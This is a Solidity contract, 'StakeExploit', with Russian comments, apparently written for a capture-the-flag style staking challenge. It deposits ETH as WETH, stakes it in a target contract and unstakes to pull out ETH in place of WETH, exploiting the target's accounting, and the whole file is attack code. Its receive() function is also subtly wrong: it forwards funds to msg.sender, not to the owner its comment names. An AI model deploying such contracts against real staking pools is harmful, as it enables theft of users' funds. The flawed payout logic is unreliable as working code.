// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeWETH(uint256 amount) external returns (bool);

    function Unstake(uint256 amount) external returns (bool);

    function UserStake(address user) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract StakeExploit {
    IStake public stakeContract;
    IWETH public wethContract;

    constructor(address _stakeContract, address _wethContract) {
        stakeContract = IStake(_stakeContract);
        wethContract = IWETH(_wethContract);
    }

    // Шаг 1: Пополним баланс WETH контракта
    function depositWETH() public payable {
        wethContract.deposit{value: msg.value}();
    }

    // Шаг 2: Вносим WETH в стейкинг контракт
    function executeExploit() public {
        uint256 wethBalance = wethContract.balanceOf(address(this));
        require(wethBalance > 0.001 ether, "Need more ETH");

        // Одобряем стейкинг контракту использовать наши WETH
        wethContract.approve(address(stakeContract), wethBalance);

        // Вносим WETH в стейкинг
        stakeContract.StakeWETH(wethBalance);

        // Выводим ETH вместо WETH
        uint256 stakedAmount = stakeContract.UserStake(address(this));
        stakeContract.Unstake(stakedAmount);
    }

    // Получаем ETH и выводим владельцу
    receive() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
